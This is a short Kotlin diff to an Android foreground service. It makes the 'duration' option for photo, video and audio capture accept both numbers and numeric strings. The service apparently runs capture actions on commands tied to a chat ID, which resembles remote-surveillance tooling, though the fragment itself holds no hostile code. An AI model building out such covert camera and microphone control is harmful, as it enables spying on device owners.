@@ -303,7 +303,15 @@ class ForegroundActionService : Service() {
             if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
             if (type == "video" || type == "photo") {
                 if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
-                if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
+                if (options.has("duration")) {
+                    val raw = options.get("duration")
+                    val dur = when (raw) {
+                        is Number -> raw.toInt()
+                        is String -> raw.toIntOrNull() ?: 60
+                        else -> 60
+                    }
+                    intent.putExtra("duration", dur)
+                }
             }
             chatId?.let { intent.putExtra("chat_id", it) }
             intent.putExtra("command_id", commandId)
@@ -314,7 +322,12 @@ class ForegroundActionService : Service() {
             }
         }
         fun startAudioAction(context: Context, options: JSONObject, chatId: String?, commandId: Long) {
-            val duration = options.optInt("duration", 60)
+            val raw = options.opt("duration")
+            val duration = when (raw) {
+                is Number -> raw.toInt()
+                is String -> raw.toIntOrNull() ?: 60
+                else -> 60
+            }
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "audio")
             intent.putExtra("duration", duration)
